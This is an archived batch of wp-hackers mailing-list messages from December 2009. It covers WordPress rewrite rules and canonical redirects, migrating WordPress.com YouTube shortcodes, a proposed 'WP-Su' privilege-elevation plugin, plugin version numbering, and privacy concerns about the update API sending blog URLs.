Subject: [wp-hackers] Bug or feature: Wordpress default rewrite rules cannot
	be overridden?
Message-ID: <4B1BAA7D.4030404@gmail.com>

Hi,

I'm tearing my hair out on this one:

I have a url like this:

http://site.dev/this-is-a-page/this-is-my-public-query-var/this-is-a-random-string/

or without permalinks

http://site.dev/?pagename=this-is-a-page&my-extra-var=this-is-my-public-query-var&this-is-a-var=this-is-a-random-string

Which works and returns this-is-a-random-string to this-is-a-var query
variable in my this-is-page page template so I can process it further.

However when this-is-a-random == an-existing-post-name it does not work
instead it redirects to the single post template. BUT only when
permalinks are switched on! If permalinks are off it still works.

I have checked the url rewrite rules, using both the more than awesome
Ask Apache rewrite rules viewer as well as var_dump the global
wp_rewrite object. I can see clearly that my rules are added on top of
the rules so they should be first to processed. This confirms the
behaviour when permalinks are switched off. However with permalinks
switched on Wordpress dodges the rules and heads straight to the single
post when it encounters a postname. Is this a bug or a feature? How can
I overrule this?

Basically what I want is

First check my rules for blog posts and use these if they match
otherwise continue with the default rules/behaviour, which it does for
all strings not similar to an existing postname.

Any help much appreciated!

-- 

met vriendelijke groet,
Bjorn Wijers

* b u r o b j o r n .nl *
digitaal vakmanschap | digital craftsmanship

Concordiastraat 68-126
3551 EM Utrecht
The Netherlands

phone: +31 6 49 74 78 70
http://www.burobjorn.nl

From charles at cefm.ca  Sun Dec  6 13:18:59 2009
From: charles at cefm.ca (Charles Frees-Melvin)
Date: Sun, 6 Dec 2009 09:18:59 -0400
Subject: [wp-hackers] Little problem while importing Wordpress.com WXR
	into regular wordpress installation...
In-Reply-To: <666eb9f0912060059l6912a599k200a10edccfb7b81@mail.gmail.com>
References: <9aa12a490912060013t1c9394bdi15bad6adb4a39528@mail.gmail.com>
	<666eb9f0912060059l6912a599k200a10edccfb7b81@mail.gmail.com>
Message-ID: <3E13FE6B-18AB-4A30-ABEA-05FD536701B4@cefm.ca>

Or when 2.9 comes out remove the [youtube] with the new embeds.

On 2009-12-06, at 4:59 AM, Joost de Valk wrote:

> Viper's Video Quick Tags would be of help here:
> 
> http://www.viper007bond.com/wordpress-plugins/vipers-video-quicktags/
> 
> Although I don't know whether it supports that specific syntax, if it
> doesn't, you might have to change it to
> 
> [youtube]http://in.youtube.com/watch?v=VWE7oVKe2Ws[/youtube]
> 
> That's quite easily done using this plugin:
> 
> http://wordpress.org/extend/plugins/search-and-replace/
> 
> Hope that helps,
> 
> Cheers
> Joost
> 
> On Sun, Dec 6, 2009 at 9:13 AM, Davit Barbakadze <jayarjo at gmail.com> wrote:
> 
>> Wordpress.com let's users to embed youtube videos (and some others)
>> using following syntax:
>> 
>> [youtube=http://in.youtube.com/watch?v=VWE7oVKe2Ws]
>> 
>> Now when we did export from Wordpress.com and imported WXR into
>> regular wordpress installation, all we get in the post is that tag in
>> textual representation. No resolution into embed video happens. I
>> guess it's because regular wordpress doesn't support this syntax. Is
>> there any plugin that does mimic such behavior? Or any hack to turn
>> those tags into embeds?
>> 
>> I know it's possible to write a plugin, but maybe there already exists one?
>> 
>> --
>> Davit Barbakadze
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From if.website at gmail.com  Sun Dec  6 13:33:11 2009
From: if.website at gmail.com (Austin Matzko)
Date: Sun, 6 Dec 2009 07:33:11 -0600
Subject: [wp-hackers] Bug or feature: Wordpress default rewrite rules
	cannot be overridden?
In-Reply-To: <4B1BAA7D.4030404@gmail.com>
References: <4B1BAA7D.4030404@gmail.com>
Message-ID: <674b4a3b0912060533p3f479c79vb004dc64528b26fa@mail.gmail.com>

On Sun, Dec 6, 2009 at 6:58 AM, Bjorn Wijers <burobjorn at gmail.com> wrote:
> However when this-is-a-random == an-existing-post-name it does not work
> instead it redirects to the single post template. BUT only when
> permalinks are switched on! If permalinks are off it still works.

I believe what you're seeing is a feature called "canonical redirect,"
which attempts to guess the correct destination for non-matching URLs.

> Basically what I want is
>
> First check my rules for blog posts and use these if they match
> otherwise continue with the default rules/behaviour, which it does for
> all strings not similar to an existing postname.

You should be able to disable canonical redirect like so:

remove_action('template_redirect', 'redirect_canonical');

From jayarjo at gmail.com  Sun Dec  6 14:01:09 2009
From: jayarjo at gmail.com (Davit Barbakadze)
Date: Sun, 6 Dec 2009 18:01:09 +0400
Subject: [wp-hackers] Little problem while importing Wordpress.com WXR
	into regular wordpress installation...
In-Reply-To: <3E13FE6B-18AB-4A30-ABEA-05FD536701B4@cefm.ca>
References: <9aa12a490912060013t1c9394bdi15bad6adb4a39528@mail.gmail.com>
	<666eb9f0912060059l6912a599k200a10edccfb7b81@mail.gmail.com>
	<3E13FE6B-18AB-4A30-ABEA-05FD536701B4@cefm.ca>
Message-ID: <9aa12a490912060601na199bffx561567ed1709b0cc@mail.gmail.com>

Thank you Joost, Charles. But your solution doesn't help, since I
still need to replace those tags in each and every post to support new
syntax.

http://wordpress.org/extend/plugins/search-and-replace/ plugin is
good, but I don't think that it supports regular expressions, does it?
Otherwise how I can do a healthy substitution of the tag in question?

I just can't believe that I'm first one to encounter this problem.
Someone should have hit this wall before. Many times.

Ok, I'll just write a filter and use
http://www.viper007bond.com/wordpress-plugins/vipers-video-quicktags/

On Sun, Dec 6, 2009 at 5:18 PM, Charles Frees-Melvin <charles at cefm.ca> wrote:
> Or when 2.9 comes out remove the [youtube] with the new embeds.
>
> On 2009-12-06, at 4:59 AM, Joost de Valk wrote:
>
>> Viper's Video Quick Tags would be of help here:
>>
>> http://www.viper007bond.com/wordpress-plugins/vipers-video-quicktags/
>>
>> Although I don't know whether it supports that specific syntax, if it
>> doesn't, you might have to change it to
>>
>> [youtube]http://in.youtube.com/watch?v=VWE7oVKe2Ws[/youtube]
>>
>> That's quite easily done using this plugin:
>>
>> http://wordpress.org/extend/plugins/search-and-replace/
>>
>> Hope that helps,
>>
>> Cheers
>> Joost
>>
>> On Sun, Dec 6, 2009 at 9:13 AM, Davit Barbakadze <jayarjo at gmail.com> wrote:
>>
>>> Wordpress.com let's users to embed youtube videos (and some others)
>>> using following syntax:
>>>
>>> [youtube=http://in.youtube.com/watch?v=VWE7oVKe2Ws]
>>>
>>> Now when we did export from Wordpress.com and imported WXR into
>>> regular wordpress installation, all we get in the post is that tag in
>>> textual representation. No resolution into embed video happens. I
>>> guess it's because regular wordpress doesn't support this syntax. Is
>>> there any plugin that does mimic such behavior? Or any hack to turn
>>> those tags into embeds?
>>>
>>> I know it's possible to write a plugin, but maybe there already exists one?
>>>
>>> --
>>> Davit Barbakadze
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Davit Barbakadze

From burobjorn at gmail.com  Sun Dec  6 14:04:59 2009
From: burobjorn at gmail.com (Bjorn Wijers)
Date: Sun, 06 Dec 2009 15:04:59 +0100
Subject: [wp-hackers] Bug or feature: Wordpress default rewrite rules
 cannot be overridden?
In-Reply-To: <674b4a3b0912060533p3f479c79vb004dc64528b26fa@mail.gmail.com>
References: <4B1BAA7D.4030404@gmail.com>
	<674b4a3b0912060533p3f479c79vb004dc64528b26fa@mail.gmail.com>
Message-ID: <4B1BBA0B.50308@gmail.com>

Austin,

Thank you very much for your quick reply!.

I'm not quite there yet. Since using this gives me a 404 instead of the
page it should redirect to. I presume my rule does not match correctly
when using permalinks? Or am I missing something else?

This is the rule I use:

$docs_rule3 = array(
'this-is-a-page/this-is-my-public-q-var/([a-zA-Z0-9]{1,})/?$' =>
'index.php?pagename=this-is-a-page&my-extra-var=this-is-my-public-q-var&this-is-a-var=$matches[1]'
);

To match this:

http://site.dev/this-is-a-page/this-is-my-public-query-var/this-is-a-random-string/

or without permalinks

http://site.dev/?pagename=this-is-a-page&my-extra-var=this-is-my-public-query-var&this-is-a-var=this-is-a-random-string

Both should redirect to the page. In this case with the name
this-is-a-page.

Any help much appreciated!

grtz
BjornW




Austin Matzko wrote:
> On Sun, Dec 6, 2009 at 6:58 AM, Bjorn Wijers <burobjorn at gmail.com> wrote:
>> However when this-is-a-random == an-existing-post-name it does not work
>> instead it redirects to the single post template. BUT only when
>> permalinks are switched on! If permalinks are off it still works.
> 
> I believe what you're seeing is a feature called "canonical redirect,"
> which attempts to guess the correct destination for non-matching URLs.
> 
>> Basically what I want is
>>
>> First check my rules for blog posts and use these if they match
>> otherwise continue with the default rules/behaviour, which it does for
>> all strings not similar to an existing postname.
> 
> You should be able to disable canonical redirect like so:
> 
> remove_action('template_redirect', 'redirect_canonical');
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
> 


-- 

met vriendelijke groet,
Bjorn Wijers

* b u r o b j o r n .nl *
digitaal vakmanschap | digital craftsmanship

Concordiastraat 68-126
3551 EM Utrecht
The Netherlands

phone: +31 6 49 74 78 70
http://www.burobjorn.nl

From if.website at gmail.com  Sun Dec  6 15:36:39 2009
From: if.website at gmail.com (Austin Matzko)
Date: Sun, 6 Dec 2009 09:36:39 -0600
Subject: [wp-hackers] Bug or feature: Wordpress default rewrite rules
	cannot be overridden?
In-Reply-To: <4B1BBA0B.50308@gmail.com>
References: <4B1BAA7D.4030404@gmail.com>
	<674b4a3b0912060533p3f479c79vb004dc64528b26fa@mail.gmail.com>
	<4B1BBA0B.50308@gmail.com>
Message-ID: <674b4a3b0912060736w11286a6drc6e76a5bc3949103@mail.gmail.com>

On Sun, Dec 6, 2009 at 8:04 AM, Bjorn Wijers <burobjorn at gmail.com> wrote:
> $docs_rule3 = array(
> 'this-is-a-page/this-is-my-public-q-var/([a-zA-Z0-9]{1,})/?$' =>
> 'index.php?pagename=this-is-a-page&my-extra-var=this-is-my-public-q-var&this-is-a-var=$matches[1]'
> );
>
> To match this:
>
> http://site.dev/this-is-a-page/this-is-my-public-query-var/this-is-a-random-string/

The rule has "this-is-my-public-q-var" and the request has
"this-is-my-public-query-var".

From burobjorn at gmail.com  Sun Dec  6 16:24:51 2009
From: burobjorn at gmail.com (Bjorn Wijers)
Date: Sun, 06 Dec 2009 17:24:51 +0100
Subject: [wp-hackers] Bug or feature: Wordpress default rewrite rules
 cannot be overridden?
In-Reply-To: <4B1BBA0B.50308@gmail.com>
References: <4B1BAA7D.4030404@gmail.com>	<674b4a3b0912060533p3f479c79vb004dc64528b26fa@mail.gmail.com>
	<4B1BBA0B.50308@gmail.com>
Message-ID: <4B1BDAD3.3060502@gmail.com>

I will answer my own question so people searching the archives might
benefit from my experience:

It seems that this was indeed not working due to a faulty regex pattern.

Instead of this pattern: ([a-zA-Z0-9]{1,})

I needed to use: ([^/]+)

Now a postname (which very likely contains a hyphen to replace spaces)
will be matched. The previous pattern would only match strings without
hyphens and thus it could not find my rule, and the canonical redirect
kicked in.

Thanks again to Austin Matzko for pointing me in the right direction!

grtz
BjornW

> Austin,
> 
> Thank you very much for your quick reply!.
> 
> I'm not quite there yet. Since using this gives me a 404 instead of the
> page it should redirect to. I presume my rule does not match correctly
> when using permalinks? Or am I missing something else?
> 
> This is the rule I use:
> 
> $docs_rule3 = array(
> 'this-is-a-page/this-is-my-public-q-var/([a-zA-Z0-9]{1,})/?$' =>
> 'index.php?pagename=this-is-a-page&my-extra-var=this-is-my-public-q-var&this-is-a-var=$matches[1]'
> );
> 
> To match this:
> 
> http://site.dev/this-is-a-page/this-is-my-public-query-var/this-is-a-random-string/
> 
> or without permalinks
> 
> http://site.dev/?pagename=this-is-a-page&my-extra-var=this-is-my-public-query-var&this-is-a-var=this-is-a-random-string
> 
> Both should redirect to the page. In this case with the name
> this-is-a-page.
> 
> Any help much appreciated!
> 
> grtz
> BjornW
> 
> 
> 
> 
> Austin Matzko wrote:
>> On Sun, Dec 6, 2009 at 6:58 AM, Bjorn Wijers <burobjorn at gmail.com> wrote:
>>> However when this-is-a-random == an-existing-post-name it does not work
>>> instead it redirects to the single post template. BUT only when
>>> permalinks are switched on! If permalinks are off it still works.
>> I believe what you're seeing is a feature called "canonical redirect,"
>> which attempts to guess the correct destination for non-matching URLs.
>>
>>> Basically what I want is
>>>
>>> First check my rules for blog posts and use these if they match
>>> otherwise continue with the default rules/behaviour, which it does for
>>> all strings not similar to an existing postname.
>> You should be able to disable canonical redirect like so:
>>
>> remove_action('template_redirect', 'redirect_canonical');
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
> 
> 


-- 

met vriendelijke groet,
Bjorn Wijers

* b u r o b j o r n .nl *
digitaal vakmanschap | digital craftsmanship

Concordiastraat 68-126
3551 EM Utrecht
The Netherlands

phone: +31 6 49 74 78 70
http://www.burobjorn.nl

From scribu at gmail.com  Sun Dec  6 16:20:31 2009
From: scribu at gmail.com (scribu)
Date: Sun, 6 Dec 2009 18:20:31 +0200
Subject: [wp-hackers] overriding a class method for just one theme
In-Reply-To: <1260094345.10407.16.camel@home>
References: <1260094345.10407.16.camel@home>
Message-ID: <349fe48b0912060820y135459f2k590d5cd09699dfee@mail.gmail.com>

Yes, creating your own walker class is the right way to do it, in this case.


On Sun, Dec 6, 2009 at 12:12 PM, Ghodmode <ghodmode at ghodmode.com> wrote:

> If I extend a WordPress class and override one or more methods, is there
> a common convention that I should follow for where I define my class?
>

No.



> Right now I only need it for a specific theme I'm working on, but I'll
> probably want to use this again, so I don't think I should put it into
> functions.php for the theme I'm working on.
>
> Should I create my own includes directory either from the document root
> or the theme's directory (ie: /wp-content/themes/mytheme/includes), and
> put the php file containing the class in there?
>

Put it wherever is most confortable.


-- 
http://scribu.net

From tunamaxx at yahoo.com  Sun Dec  6 18:57:40 2009
From: tunamaxx at yahoo.com (Tuna Can)
Date: Sun, 6 Dec 2009 10:57:40 -0800 (PST)
Subject: [wp-hackers] Su for WP: wp-su (Was: Possible security patch)
Message-ID: <998912.36600.qm@web65714.mail.ac4.yahoo.com>

For whatever my opinion is worth, WP-Su sounds like a great idea. Like most security related practices, those that understand the benefits can partake, and those that don't care or are unaware can continue blissfully oblivious. ;)




On 2009-12-05, at 8:55 PM, "Dion Hulse (dd32)" <wordpress at dd32.id.au> wrote:

On Sun, 06 Dec 2009 15:29:44 +1100, Ian Stewart <ian at themeshaper.com> wrote:

The correct solution probably is to avoid
using the admin account for posting. I'd argue though that most people do
use the admin account for posting and will continue to whether or not it is
the correct solution. Even if they know it's the correct solution. Just like
people choose to use weak passwords

I've been working on a plugin the past few days for that exact reason, That a lot of users just use a Administrative account..

The idea? Wp-Su

Put simply, It adds an extra line of security to WordPress, No longer do you have an Administrative account, You have an account with minimal privledges -  Enough to let you write posts, edit posts, and do the majority of what you would do..
But in the event that you wish to change a blog option, Theres no need to log out and log into the admin account, Just hit the Su link, Type in the extra password (Which can(should) differ from you user account password), and all the administrative features are open (For a predetermined time, 5minutes? 15, 30minutes).

I've had some people ask me flat out, Whats the point. Just use a Editor account. OR Why? Arnt people just going to sniff the Su password as well?

I came up with a simple list for that:
1. Users should never use accounts which have more privledges than they require
2. Users should only ever log into administrative accounts on computers/networks they trust 100%
3. Users should never use the same password for everything
4. Majority of keyloggers are generally only targetting User/password combinations

How many people know of a user who doesnt follow 1-3?
How many people know of a bank which no longer uses a username and password combo? And instead, Has an extra layer of security (Picture password for example, or SMS)? - Pretty much all of them.

Currently.. My plugin is unreleased, However, will be out by the time 2.9 ships, will require WP 2.9, and whilst the UI integration isnt as good as i'd like (due to WP shortcomings in filters at present), Uses a extra text password (instead of Pictures/phrases/whatever), and is presently mainly a proof of concept.

Right now, The user enables the plugin, Selects which roles should have access to a Su environment, and select which caps should be protected by Su use (ie. Plugin, Blog, Theme and User options/edits should only be done by Su users, However Post publishing, page editing, etc can be done by a "normal" user).. I'm hoping to extend that to have a short wizard which prompts to user to set it up properly before release however.

Thoughts? Anyone want the Beta? (Email me off list please - It could do with some security testing before release.. Not sure i got the User Cookie 100% right)
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers



      __________________________________________________________________
Ask a question on any topic and get answers from real people. Go to Yahoo! Answers and share what you know at http://ca.answers.yahoo.com


From mikeschinkel at newclarity.net  Sun Dec  6 19:28:44 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Sun, 6 Dec 2009 14:28:44 -0500
Subject: [wp-hackers] Little problem while importing Wordpress.com WXR
	into regular wordpress installation...
In-Reply-To: <9aa12a490912060601na199bffx561567ed1709b0cc@mail.gmail.com>
References: <9aa12a490912060013t1c9394bdi15bad6adb4a39528@mail.gmail.com>
	<666eb9f0912060059l6912a599k200a10edccfb7b81@mail.gmail.com>
	<3E13FE6B-18AB-4A30-ABEA-05FD536701B4@cefm.ca>
	<9aa12a490912060601na199bffx561567ed1709b0cc@mail.gmail.com>
Message-ID: <D7798247-17C1-43F9-B109-D126825E6517@newclarity.net>

Charles,

Take a look at:

	http://wordpress.org/extend/plugins/smart-youtube/

From it's "main features" list:

-- Supports migrated blogs from Wordpress.com replacing [youtube=youtubeadresss]

HTH.

Mike Schinkel

that supports the same syna
On Dec 6, 2009, at 9:01 AM, Davit Barbakadze wrote:

> Thank you Joost, Charles. But your solution doesn't help, since I
> still need to replace those tags in each and every post to support new
> syntax.
> 
> http://wordpress.org/extend/plugins/search-and-replace/ plugin is
> good, but I don't think that it supports regular expressions, does it?
> Otherwise how I can do a healthy substitution of the tag in question?
> 
> I just can't believe that I'm first one to encounter this problem.
> Someone should have hit this wall before. Many times.
> 
> Ok, I'll just write a filter and use
> http://www.viper007bond.com/wordpress-plugins/vipers-video-quicktags/
> 
> On Sun, Dec 6, 2009 at 5:18 PM, Charles Frees-Melvin <charles at cefm.ca> wrote:
>> Or when 2.9 comes out remove the [youtube] with the new embeds.
>> 
>> On 2009-12-06, at 4:59 AM, Joost de Valk wrote:
>> 
>>> Viper's Video Quick Tags would be of help here:
>>> 
>>> http://www.viper007bond.com/wordpress-plugins/vipers-video-quicktags/
>>> 
>>> Although I don't know whether it supports that specific syntax, if it
>>> doesn't, you might have to change it to
>>> 
>>> [youtube]http://in.youtube.com/watch?v=VWE7oVKe2Ws[/youtube]
>>> 
>>> That's quite easily done using this plugin:
>>> 
>>> http://wordpress.org/extend/plugins/search-and-replace/
>>> 
>>> Hope that helps,
>>> 
>>> Cheers
>>> Joost
>>> 
>>> On Sun, Dec 6, 2009 at 9:13 AM, Davit Barbakadze <jayarjo at gmail.com> wrote:
>>> 
>>>> Wordpress.com let's users to embed youtube videos (and some others)
>>>> using following syntax:
>>>> 
>>>> [youtube=http://in.youtube.com/watch?v=VWE7oVKe2Ws]
>>>> 
>>>> Now when we did export from Wordpress.com and imported WXR into
>>>> regular wordpress installation, all we get in the post is that tag in
>>>> textual representation. No resolution into embed video happens. I
>>>> guess it's because regular wordpress doesn't support this syntax. Is
>>>> there any plugin that does mimic such behavior? Or any hack to turn
>>>> those tags into embeds?
>>>> 
>>>> I know it's possible to write a plugin, but maybe there already exists one?
>>>> 
>>>> --
>>>> Davit Barbakadze
>>>> _______________________________________________
>>>> wp-hackers mailing list
>>>> wp-hackers at lists.automattic.com
>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>> 
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> 
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> 
> 
> 
> 
> -- 
> Davit Barbakadze
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From joost at yoast.com  Sun Dec  6 19:55:39 2009
From: joost at yoast.com (Joost de Valk)
Date: Sun, 6 Dec 2009 20:55:39 +0100
Subject: [wp-hackers] Plugin updates
Message-ID: <666eb9f0912061155h1418d356m853e679f35bb2dba@mail.gmail.com>

Ok, I'm now totally confused with how the version numbers work in the WP
plugin repository.

I released an update to my Google Analytics plugin (
http://wordpress.org/extend/plugins/google-analytics-for-wordpress/)
bringing it to version 3.2.5. I changed the version number in:
- the readme.txt in the trunk directory
- the main plugin file in the trunk directory
- added a tag directory with that version number and the correct number in
the readme.txt file there

I only missed one: the plugin file in that tags directory. Now a very weird
thing happened: if you downloaded the plugin, you got version 3.2.5. If you
were on 3.2.2 and upgraded, you got 3.2.5. However, if you were on 3.2.4,
you didn't get an update notice...

That sounds like a bug, doesn't it?

Cheers
Joost

From lynne.pope at gmail.com  Mon Dec  7 01:03:21 2009
From: lynne.pope at gmail.com (Lynne Pope)
Date: Mon, 7 Dec 2009 14:03:21 +1300
Subject: [wp-hackers] Su for WP: wp-su (Was: Possible security patch)
In-Reply-To: <op.u4h3to2pspxmuu@dd32>
References: <op.u4h2mhcwspxmuu@dd32>
	<474320ee0912052109u6261b7bbvf86ef3a8fd1a36bf@mail.gmail.com> 
	<op.u4h3to2pspxmuu@dd32>
Message-ID: <427667db0912061703s140fe833sf62ea69a109540cb@mail.gmail.com>

+1 from me. I think this sounds like a great idea. I don't believe it should
be part of core, but I'd definitely be recommending it to people. An extra
layer of security is always a good thing.

Cheers,
Lynne

2009/12/6 Dion Hulse (dd32) <wordpress at dd32.id.au>

> I thought of the same thing. And in the end, I thought, If i dont try,
> it'll never happen.
>
> Ultimately, Those who use it will be someone who's had WP installed by
> someone else, Or have googled on how to keep their installs secure i think..
> Originally it was more of a POC, but after talking to a few people about it,
> they saw the benefit of it.
>
> I myself, Do not actually abide by most of those security rules i listed..
> So i know theres definately a chunk of users out there for it :)
>
>
>
> On Sun, 06 Dec 2009 16:09:18 +1100, Steven Rossi <SuperMoonMan at gmail.com>
> wrote:
>
>  Sounds like a cool plugin which will certainly serve its purpose for users
>> that install it. The problem it might run into is that
>> getting-people-to-use-it part. People that know how this stuff works well
>> enough to realize they should be using something like this are probably
>> already using something like this--or at least being smart about their
>> usernames/passwords. Because really, something like this is definitely an
>> inconvenience, despite it providing valuable security. If you could get
>> the
>> message of the importance of this out there, I totally support your
>> plugin.
>>
>> Steven Rossi
>> http://www.letsmovetothemoon.com
>> http://www.stevenjrossi.com
>> http://www.twitter.com/supermoonman
>>
>> On Sat, Dec 5, 2009 at 11:55 PM, Dion Hulse (dd32) <wordpress at dd32.id.au
>> >wrote:
>>
>>  On Sun, 06 Dec 2009 15:29:44 +1100, Ian Stewart <ian at themeshaper.com>
>>> wrote:
>>>
>>>  The correct solution probably is to avoid
>>>
>>>> using the admin account for posting. I'd argue though that most people
>>>> do
>>>> use the admin account for posting and will continue to whether or not it
>>>> is
>>>> the correct solution. Even if they know it's the correct solution. Just
>>>> like
>>>> people choose to use weak passwords
>>>>
>>>>
>>> I've been working on a plugin the past few days for that exact reason,
>>> That
>>> a lot of users just use a Administrative account..
>>>
>>> The idea? Wp-Su
>>>
>>> Put simply, It adds an extra line of security to WordPress, No longer do
>>> you have an Administrative account, You have an account with minimal
>>> privledges -  Enough to let you write posts, edit posts, and do the
>>> majority
>>> of what you would do..
>>> But in the event that you wish to change a blog option, Theres no need to
>>> log out and log into the admin account, Just hit the Su link, Type in the
>>> extra password (Which can(should) differ from you user account password),
>>> and all the administrative features are open (For a predetermined time,
>>> 5minutes? 15, 30minutes).
>>>
>>> I've had some people ask me flat out, Whats the point. Just use a Editor
>>> account. OR Why? Arnt people just going to sniff the Su password as well?
>>>
>>> I came up with a simple list for that:
>>>  1. Users should never use accounts which have more privledges than they
>>> require
>>>  2. Users should only ever log into administrative accounts on
>>> computers/networks they trust 100%
>>>  3. Users should never use the same password for everything
>>>  4. Majority of keyloggers are generally only targetting User/password
>>> combinations
>>>
>>> How many people know of a user who doesnt follow 1-3?
>>> How many people know of a bank which no longer uses a username and
>>> password
>>> combo? And instead, Has an extra layer of security (Picture password for
>>> example, or SMS)? - Pretty much all of them.
>>>
>>> Currently.. My plugin is unreleased, However, will be out by the time 2.9
>>> ships, will require WP 2.9, and whilst the UI integration isnt as good as
>>> i'd like (due to WP shortcomings in filters at present), Uses a extra
>>> text
>>> password (instead of Pictures/phrases/whatever), and is presently mainly
>>> a
>>> proof of concept.
>>>
>>> Right now, The user enables the plugin, Selects which roles should have
>>> access to a Su environment, and select which caps should be protected by
>>> Su
>>> use (ie. Plugin, Blog, Theme and User options/edits should only be done
>>> by
>>> Su users, However Post publishing, page editing, etc can be done by a
>>> "normal" user).. I'm hoping to extend that to have a short wizard which
>>> prompts to user to set it up properly before release however.
>>>
>>> Thoughts? Anyone want the Beta? (Email me off list please - It could do
>>> with some security testing before release.. Not sure i got the User
>>> Cookie
>>> 100% right)
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>
>>>  _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>>
>
> --
> Using Opera's revolutionary e-mail client: http://www.opera.com/mail/
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
http://twitter.com/elpie/

From lynne.pope at gmail.com  Mon Dec  7 05:08:44 2009
From: lynne.pope at gmail.com (Lynne Pope)
Date: Mon, 7 Dec 2009 18:08:44 +1300
Subject: [wp-hackers] Revisiting phone home and privacy
Message-ID: <427667db0912062108t493589c9k5e999b9904f6ecb8@mail.gmail.com>

Back in 2007 we had some huge arguments over the phone home "features" of WP
2.3.
There appeared to be general agreement that sending the blog URL to
WordPress was unnecessary and that querying for updates did not require the
disclosure of personally indentifying information.

At that time, Matt said (
http://comox.textdrive.com/pipermail/wp-hackers/2007-September/014886.html)
this would be reviewed:

URLs are useful unique identifiers and in my opinion the best one to use on
> the web. You can normalize them, organize them by domains and subdomains,
> look for odd characters or paths, create stats by TLDs, map them to hosting
> providers, use them as a basis for a crawl, and associate them with
> WordPress.org profiles. MD5s are unique, but don't have a lot of value
> beyond that, and even a capitalization or trailing slash change will change
> the whole MD5. There are also things I think we haven't imagined yet that
> could make URLs useful. Maybe a .org toolbar that ties into your .org
> profile and makes it easy to manage multiple blogs and tie them together. If
> by the time 2.5 comes around we're still not doing anything useful with it
> then we can re-examine it.
>

In the absence of any statement on wordpress.org to tell users what data is
being collected and how it is being used, I would like to know if WordPress
has found any need to collect blog URL's?  If it has, then this should be
disclosed, if it has not then perhaps we should be replacing the blog URL
with an anonymous identifier.

People are even more aware of privacy now than they were in 2007. Revisiting
this is overdue.

Lynne
-- 
http://twitter.com/elpie/

From markjaquith at gmail.com  Mon Dec  7 05:49:58 2009
From: markjaquith at gmail.com (Mark Jaquith)
Date: Mon, 7 Dec 2009 00:49:58 -0500
Subject: [wp-hackers] Revisiting phone home and privacy
In-Reply-To: <427667db0912062108t493589c9k5e999b9904f6ecb8@mail.gmail.com>
References: <427667db0912062108t493589c9k5e999b9904f6ecb8@mail.gmail.com>
Message-ID: <2979bd660912062149v583780a2vcec94ec1b7c967c1@mail.gmail.com>

On Mon, Dec 7, 2009 at 12:08 AM, Lynne Pope <lynne.pope at gmail.com> wrote:
> In the absence of any statement on wordpress.org to tell users what data is
> being collected and how it is being used, I would like to know if WordPress
> has found any need to collect blog URL's? ?If it has, then this should be
> disclosed, if it has not then perhaps we should be replacing the blog URL
> with an anonymous identifier.

wordpress.org has a privacy policy that applies to any information
sent to the site, which would include the API.

http://wordpress.org/about/privacy/

It's fairly standard. The meat:

"WordPress.org will not rent or sell potentially
personally-identifying and personally-identifying information"

-- 
Mark Jaquith
? http://markjaquith.com/
? http://coveredwebservices.com/

From markjaquith at gmail.com  Mon Dec  7 06:28:43 2009
From: markjaquith at gmail.com (Mark Jaquith)
Date: Mon, 7 Dec 2009 01:28:43 -0500
Subject: [wp-hackers] Plugin updates
In-Reply-To: <666eb9f0912061155h1418d356m853e679f35bb2dba@mail.gmail.com>
References: <666eb9f0912061155h1418d356m853e679f35bb2dba@mail.gmail.com>
Message-ID: <2979bd660912062228q337fd380qa1acdac463af59c8@mail.gmail.com>

On Sun, Dec 6, 2009 at 2:55 PM, Joost de Valk <joost at yoast.com> wrote:
> if you downloaded the plugin, you got version 3.2.5. If you
> were on 3.2.2 and upgraded, you got 3.2.5. However, if you were on 3.2.4,
> you didn't get an update notice...

I installed 3.2.4 and I was immediately given an upgrade notice for
3.2.5, which worked.

That's running WP 2.9 /trunk/

-- 
Mark Jaquith
? http://markjaquith.com/
? http://coveredwebservices.com/

From lynne.pope at gmail.com  Mon Dec  7 06:33:24 2009
From: lynne.pope at gmail.com (Lynne Pope)
Date: Mon, 7 Dec 2009 19:33:24 +1300
Subject: [wp-hackers] Revisiting phone home and privacy
In-Reply-To: <2979bd660912062149v583780a2vcec94ec1b7c967c1@mail.gmail.com>
References: <427667db0912062108t493589c9k5e999b9904f6ecb8@mail.gmail.com> 
	<2979bd660912062149v583780a2vcec94ec1b7c967c1@mail.gmail.com>
Message-ID: <427667db0912062233l20b578b4u565a307c15c2d595@mail.gmail.com>

2009/12/7 Mark Jaquith <markjaquith at gmail.com>

> On Mon, Dec 7, 2009 at 12:08 AM, Lynne Pope <lynne.pope at gmail.com> wrote:
> > In the absence of any statement on wordpress.org to tell users what data
